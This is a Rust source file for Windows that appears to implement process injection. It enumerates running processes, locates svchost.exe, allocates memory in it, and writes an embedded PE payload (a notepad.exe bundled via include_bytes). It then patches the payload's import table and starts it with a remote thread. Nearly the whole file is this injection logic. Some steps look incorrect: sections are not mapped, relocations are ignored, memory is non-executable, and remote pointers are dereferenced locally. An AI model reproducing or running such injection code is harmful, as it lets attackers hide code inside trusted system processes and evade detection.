use std::{fmt, io, ptr};
use std::{ffi::CString, mem::size_of};
use std::mem::{self, MaybeUninit, size_of_val};
use std::ptr::NonNull;

use winapi::ctypes::c_void;
use winapi::shared::minwindef::{DWORD, FALSE, HMODULE , LPVOID,};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::psapi::{EnumProcesses, EnumProcessModules, GetModuleBaseNameA};
use winapi::um::winnt;
use winapi::um::winnt::{IMAGE_ORDINAL_FLAG64, IMAGE_THUNK_DATA64, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_VM_OPERATION};
use winapi::um::memoryapi::VirtualAllocEx;
use winapi::um::memoryapi::{WriteProcessMemory , ReadProcessMemory};
use winapi::shared::minwindef::BOOL;
use pe_parser::pe::parse_portable_executable;
use winapi::um::processthreadsapi::CreateRemoteThreadEx;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::HANDLE;
use winapi::um::processthreadsapi::ResumeThread;
use winapi::um::libloaderapi::LoadLibraryA;
use winapi::um::winnt::{IMAGE_THUNK_DATA , IMAGE_IMPORT_DESCRIPTOR , };
use winapi::shared::minwindef::FARPROC;
use winapi::um::winnt::IMAGE_ORDINAL_FLAG;
use winapi::um::libloaderapi::GetProcAddress;
use winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
use winapi::um::winnt::LPCSTR;
use winapi::um::errhandlingapi::GetLastError;
const MAX_PROC_NAME_LENGTH: usize = 64;
const MAX_PIDS: usize = 2000;
static PROGRAM_PID: Option<&str> = option_env!("PID");

static PAYLOAD: &[u8] = include_bytes!("..\\notepad.exe");



//enum processes() -> which will return an array of PIDs
pub fn enumerate_processes() -> io::Result<Vec<Process>> {
    let mut pids = Vec::<DWORD>::with_capacity(MAX_PIDS);
    let mut size = 0;

    if unsafe {
        winapi::um::psapi::EnumProcesses(
            pids.as_mut_ptr(),
            (pids.capacity() * mem::size_of::<DWORD>()) as u32,
            &mut size,
        )
    } == FALSE {
        return Err(io::Error::last_os_error());
    }

    let count = size as usize / mem::size_of::<DWORD>();
    unsafe {
        pids.set_len(count);
    }

    let mut processes = Vec::with_capacity(count);

    for pid in pids {
        if let Ok(process) = Process::open(pid) {
            processes.push(process);
        }
    }

    Ok(processes)
}
#[derive(Debug)]
pub struct Process {
    pid: DWORD,
    handle: NonNull<c_void>,
}

pub struct ProcessItem {
    pid: DWORD,
    name: String ,
    handle : NonNull<c_void>,
}

#[derive(Debug)]
pub struct PEFileInfo {
    coff_number_of_sections: u16,
    address_of_entry_point: u64,
    image_base: u64,
    size_of_image: u32,
    size_of_headers: u32,
    import_table_virtual_address: u32,
    import_table_size: u32,
}

impl Process {
    //open a process handle, given its process identifier
    pub fn open(pid: DWORD) -> io::Result<Self> {
        // the call doesn't have side effects
        NonNull::new(unsafe {
            winapi::um::processthreadsapi::OpenProcess(
                winnt::PROCESS_QUERY_INFORMATION | winnt::PROCESS_VM_READ | winnt::PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
                FALSE,
                pid,
            )
        })
            .map(|handle| Self { pid, handle })
            .ok_or_else(io::Error::last_os_error)
    }
    //return the process identifier
    pub fn pid(&self) -> DWORD {
        self.pid
    }
    // return the base name of the first module loaded by this process

    pub fn module_base_name(&self) -> io::Result<String> {
        let mut module = MaybeUninit::<HMODULE>::uninit();
        let mut size = 0;
        //SAFETY : the pointer is valid and the size is correct
        if unsafe {
            winapi::um::psapi::EnumProcessModules(
                self.handle.as_ptr(),
                module.as_mut_ptr(),
                mem::size_of::<HMODULE>() as u32,
                &mut size,
            )
        } == FALSE
        {
            return Err(io::Error::last_os_error());
        }

        //safety: the call succseeded so module is initialized
        let module = unsafe { module.assume_init() };

        let mut buffer = Vec::<u8>::with_capacity(MAX_PROC_NAME_LENGTH);

        let length = unsafe {
            winapi::um::psapi::GetModuleBaseNameA(
                self.handle.as_ptr(),
                module,
                buffer.as_mut_ptr().cast(),
                MAX_PROC_NAME_LENGTH as u32,
            )
        };
        if length == 0 {
            return Err(io::Error::last_os_error());
        }
        // safety : the call is successful , and length represents bytes
        unsafe { buffer.set_len(length as usize) }
        Ok(String::from_utf8(buffer).unwrap())
    }

    pub fn enumerate_modules(&self) -> io::Result<Vec<winapi::shared::minwindef::HMODULE>> {
        let mut size = 0;
        // safety : the pointer is valid and the indicated size is 0
        if unsafe {
            winapi::um::psapi::EnumProcessModules(
                self.handle.as_ptr(),
                ptr::null_mut(),
                0,
                &mut size,
            )
        } == FALSE {
            return Err(io::Error::last_os_error());
        }

        let mut modules = Vec::with_capacity(size as usize / mem::size_of::<HMODULE>());
        //safety : the pointer is valid and the size is correct
        if unsafe {
            winapi::um::psapi::EnumProcessModules(
                self.handle.as_ptr(),
                modules.as_mut_ptr() as *mut _,
                size,
                &mut size,
            )
        } == FALSE {
            return Err(io::Error::last_os_error());
        }

        unsafe {
            modules.set_len(size as usize / mem::size_of::<HMODULE>());
        }
        Ok(modules)
    }
}

fn allocate_memory(handle: NonNull<c_void>, size: usize) -> Option<*mut c_void> {
    unsafe {
        let allocated_memory = VirtualAllocEx(
            handle.as_ptr(),     // Handle to the process
            ptr::null_mut(),     // Let the system determine the address
            size,                // Size of the allocation
            MEM_COMMIT | MEM_RESERVE, // Allocation type
            PAGE_READWRITE       // Memory protection
        );

        if allocated_memory.is_null() {
            println!("Memory allocation failed.");
            None // Memory allocation failed
        } else {
            println!("Memory successfully allocated at address: {:?}", allocated_memory);
            Some(allocated_memory) // Return the allocated memory address
        }
    }
}


fn write_to_process(handle: NonNull<c_void>, allocated_address: *mut c_void) -> bool {
    let size = PAYLOAD.len();
    let mut bytes_written: usize = 0;

    let success: BOOL = unsafe {
        WriteProcessMemory(
            handle.as_ptr(),           // Handle to the process
            allocated_address,         // Address to write to
            PAYLOAD.as_ptr() as *const c_void, // Buffer containing the payload
            size,                      // Number of bytes to write
            &mut bytes_written as *mut _ as *mut usize, // Number of bytes written
        )
    };

    if success != 0 && bytes_written == size {
        println!("Successfully wrote payload to allocated memory.");
        true
    } else {
        println!("Failed to write payload to allocated memory.");
        false
    }
}

fn parse_payload(handle: NonNull<c_void>, allocated_address: *mut c_void) -> io::Result<PEFileInfo> {
    let mut buffer = vec![0u8; PAYLOAD.len()];
    let mut bytes_read: usize = 0;

    let success: BOOL = unsafe {
        ReadProcessMemory(
            handle.as_ptr(),          // Handle to the process
            allocated_address,        // Address to read from
            buffer.as_mut_ptr() as *mut c_void, // Buffer to store the read bytes
            buffer.len(),             // Number of bytes to read
            &mut bytes_read as *mut _ as *mut usize, // Number of bytes read
        )
    };

    if success == 0 {
        return Err(io::Error::last_os_error());
    }

    let pe = parse_portable_executable(&buffer).map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;

    let info = PEFileInfo {
        coff_number_of_sections: pe.coff.number_of_sections,
        address_of_entry_point: pe.optional_header_64.unwrap().address_of_entry_point as u64,
        image_base: pe.optional_header_64.unwrap().image_base,
        size_of_image: pe.optional_header_64.unwrap().size_of_image,
        size_of_headers: pe.optional_header_64.unwrap().size_of_headers,
        import_table_virtual_address: pe.optional_header_64.unwrap().data_directories.import_table.virtual_address,
        import_table_size: pe.optional_header_64.unwrap().data_directories.import_table.size,
    };

    println!("PEFileInfo: {:?}", info);

    Ok(info)
}

fn create_suspended_thread(handle: NonNull<c_void>, start_address: *mut c_void) -> io::Result<HANDLE> {
    let thread_handle = unsafe {
        CreateRemoteThreadEx(
            handle.as_ptr(),         // Handle to the process
            ptr::null_mut(),         // Default security attributes
            0,                       // Stack size, 0 means use the default size
            Some(mem::transmute(start_address)), // Thread start address
            ptr::null_mut(),         // No parameters passed to the thread
            0x00000004, // Create the thread in a suspended state
            ptr::null_mut(),         // Reserved, should be NULL
            ptr::null_mut(),         // Reserved, should be NULL
        )
    };

    if thread_handle.is_null() {
        Err(io::Error::last_os_error())
    } else {
        println!("Suspended thread created successfully.");
        Ok(thread_handle)
    }
}

fn resume_thread(thread_handle: HANDLE) -> io::Result<DWORD> {
    let result = unsafe { ResumeThread(thread_handle) };

    if result == DWORD::MAX {
        Err(io::Error::last_os_error())
    } else {
        Ok(result)
    }
}


fn patch_import_table(
    pe_info: &PEFileInfo,                  // Use PEFileInfo structure to get relevant PE details
    distant_module_memory_space: *mut u8,  // Base address in the remote process
    process_handle: NonNull<c_void>,       // Handle to the remote process
) -> Result<(), &'static str> {
    unsafe {
        // Calculate the base address of the import table in the remote process
        let import_table_address = distant_module_memory_space.add(pe_info.import_table_virtual_address as usize);
        println!("Import Table Address: {:?}", import_table_address);

        // Check that the import table address is within a valid range
        if import_table_address < distant_module_memory_space {
            println!("Invalid import table address: {:?}", import_table_address);
            return Err("Invalid import table address.");
        }

        // Iterate over import descriptors
        let mut import_desc = import_table_address as *mut IMAGE_IMPORT_DESCRIPTOR;

        // Loop through all import descriptors
        while (*import_desc).Name != 0 {
            println!("Processing Import Descriptor at address: {:?}", import_desc);

            // Get the name of the DLL from the remote process
            let dll_name_address = distant_module_memory_space.add((*import_desc).Name as usize);
            println!("DLL Name Address: {:?}", dll_name_address);

            // Check if the DLL name address is within a valid range
            if dll_name_address < distant_module_memory_space {
                println!("Invalid DLL name address: {:?}", dll_name_address);
                return Err("Invalid DLL name address.");
            }

            let mut dll_name = vec![0i8; MAX_PROC_NAME_LENGTH];
            let read_bytes = ReadProcessMemory(
                process_handle.as_ptr(),
                dll_name_address as LPVOID,
                dll_name.as_mut_ptr() as LPVOID,
                MAX_PROC_NAME_LENGTH as usize,
                std::ptr::null_mut(),
            );

            if read_bytes == 0 {
                println!("Failed to read DLL name from the remote process. Error code: {}", GetLastError());
                return Err("Failed to read DLL name from the remote process.");
            }

            println!("DLL Name Read: {:?}", CString::from_raw(dll_name.as_mut_ptr()).to_string_lossy());

            let dll_handle = LoadLibraryA(dll_name.as_ptr());
            if dll_handle.is_null() {
                println!("Failed to load DLL: {:?}", CString::from_raw(dll_name.as_mut_ptr()).to_string_lossy());
                return Err("Failed to load DLL.");
            }
            println!("DLL Loaded Successfully: {:?}", dll_handle);

            // Get the first thunk (IAT)
            let mut thunk_ref = distant_module_memory_space.add((*import_desc).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
            let mut original_thunk_ref = distant_module_memory_space.add(*(*import_desc).u.OriginalFirstThunk() as usize) as *mut IMAGE_THUNK_DATA64;
            println!("First Thunk Address: {:?}", thunk_ref);
            println!("Original First Thunk Address: {:?}", original_thunk_ref);

            // Check that the thunk addresses are within valid ranges
            if thunk_ref < distant_module_memory_space as *mut IMAGE_THUNK_DATA64 || original_thunk_ref < distant_module_memory_space as *mut IMAGE_THUNK_DATA64 {
                println!("Invalid thunk address: {:?} or {:?}", thunk_ref, original_thunk_ref);
                return Err("Invalid thunk address.");
            }

            while unsafe { *(*thunk_ref).u1.Function() } != 0 {
                println!("Processing Thunk at address: {:?}", thunk_ref);
                println!("Original Thunk at address: {:?}", original_thunk_ref);

                let func_address: FARPROC;

                if (*original_thunk_ref).u1.Ordinal() & IMAGE_ORDINAL_FLAG64 != 0 {
                    // Import by ordinal
                    let ordinal = (*original_thunk_ref).u1.Ordinal() & 0xFFFF;
                    println!("Import by Ordinal: {}", ordinal);
                    func_address = GetProcAddress(dll_handle, ordinal as LPCSTR);
                } else {
                    // Import by name
                    let import_by_name_address = distant_module_memory_space.add(unsafe { *(*original_thunk_ref).u1.AddressOfData() as usize });
                    println!("Import by Name Address: {:?}", import_by_name_address);

                    // Check if the import by name address is within a valid range
                    if import_by_name_address < distant_module_memory_space {
                        println!("Invalid import by name address: {:?}", import_by_name_address);
                        return Err("Invalid import by name address.");
                    }

                    let mut import_by_name = MaybeUninit::<IMAGE_IMPORT_BY_NAME>::uninit();

                    let read_bytes = ReadProcessMemory(
                        process_handle.as_ptr(),
                        import_by_name_address as LPVOID,
                        import_by_name.as_mut_ptr() as LPVOID,
                        size_of::<IMAGE_IMPORT_BY_NAME>(),
                        std::ptr::null_mut(),
                    );

                    if read_bytes == 0 {
                        println!("Failed to read import name from the remote process. Error code: {}", GetLastError());
                        return Err("Failed to read import name from the remote process.");
                    }

                    let import_by_name = import_by_name.assume_init();
                    println!("Import By Name: {:?}", CString::from_raw(import_by_name.Name.as_ptr() as *mut i8).to_string_lossy());

                    func_address = GetProcAddress(dll_handle, import_by_name.Name.as_ptr());
                }

                if func_address.is_null() {
                    println!("Failed to resolve function address.");
                    return Err("Failed to resolve function address.");
                }
                println!("Resolved Function Address: {:?}", func_address);

                // Write the function address into the IAT in the remote process
                let remote_address = thunk_ref as *mut FARPROC;
                let success = WriteProcessMemory(
                    process_handle.as_ptr(),
                    remote_address as LPVOID,
                    &func_address as *const _ as *const c_void,
                    size_of::<FARPROC>(),
                    std::ptr::null_mut(),
                );

                if success == 0 {
                    println!("Failed to write function address to the remote process. Error code: {}", GetLastError());
                    return Err("Failed to write function address to the remote process.");
                }
                println!("Successfully wrote function address to the IAT.");

                thunk_ref = thunk_ref.add(1);
                original_thunk_ref = original_thunk_ref.add(1);
            }

            import_desc = import_desc.add(1);
        }

        Ok(())
    }
}




fn main() {
    let processes = enumerate_processes().unwrap();

    for process in processes {
        if let Ok(modbasename) = process.module_base_name() {
            if modbasename.to_lowercase() == "svchost.exe" {
                println!("Found svchost.exe with PID: {} and handle: {:?}", process.pid(), process.handle);

                // Store the handle in an immutable variable
                let process_handle = process.handle;

                // Allocate memory in the svchost.exe process with the desired size
                let allocation_size = PAYLOAD.len();
                if let Some(allocated_address) = allocate_memory(process_handle, allocation_size) {
                    println!("Memory allocated at address: {:?}", allocated_address);

                    // Write the payload to the allocated memory
                    if write_to_process(process_handle, allocated_address) {
                        println!("Payload written to svchost.exe successfully.");

                        // Parse the payload from the allocated memory
                        if let Ok(info) = parse_payload(process_handle, allocated_address) {
                            println!("Parsed PE file info: {:?}", info);

                            // Patch the import table
                            let patch_result = patch_import_table(&info, allocated_address as *mut u8, process_handle);
                            match patch_result {
                                Ok(_) => println!("Import table patched successfully."),
                                Err(e) => println!("Failed to patch import table: {}", e),
                            }

                            // Create a suspended thread at the allocated memory address
                            if let Ok(thread_handle) = create_suspended_thread(process_handle, allocated_address) {
                                println!("Suspended thread created successfully. Resuming...");

                                // Resume the thread
                                match resume_thread(thread_handle) {
                                    Ok(prev_suspend_count) => {
                                        if prev_suspend_count > 0 {
                                            println!("Thread resumed successfully. Previous suspend count: {}", prev_suspend_count);
                                        } else {
                                            println!("Thread was not suspended. Suspend count: {}", prev_suspend_count);
                                        }
                                    }
                                    Err(e) => {
                                        println!("Failed to resume thread. Error: {}", e);
                                    }
                                }

                                println!("Thread execution completed.");
                            } else {
                                println!("Failed to create a suspended thread.");
                            }
                        } else {
                            println!("Failed to parse the PE file from memory.");
                        }
                    } else {
                        println!("Failed to write payload to svchost.exe.");
                    }
                } else {
                    println!("Failed to allocate memory in svchost.exe.");
                }

                break; // Exit the loop after finding the first matching svchost.exe
            }
        }
    }
}






